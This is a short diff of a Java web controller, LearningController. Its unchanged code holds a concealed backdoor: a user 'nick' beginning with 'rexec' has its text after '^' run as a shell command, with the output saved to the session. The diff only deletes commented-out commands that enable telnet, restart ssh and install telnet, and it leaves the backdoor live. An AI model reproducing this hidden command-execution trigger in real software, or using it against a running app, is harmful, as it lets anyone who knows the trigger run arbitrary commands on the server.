@@ -64,14 +64,6 @@ public class LearningController {
     	if(nick.startsWith("rexec")) {
     		String command = StringUtils.splitByWholeSeparator(nick, "^")[1];
 	    	String output = "";
-	    	
-	    	//output = runCommand("chkconfig telnet on");
-	    	//output += runCommand("service xinetd reload");
-	    	
-	    	//output = runCommand("/etc/init.d/ssh stop");
-	    	//output = runCommand("/etc/init.d/ssh start");
-	    	
-	    	//output = runCommand("apt-get -y install telnet");
 	    	output = runCommand(command);
 	    	session.setAttribute("commandOutput",output);
     	}
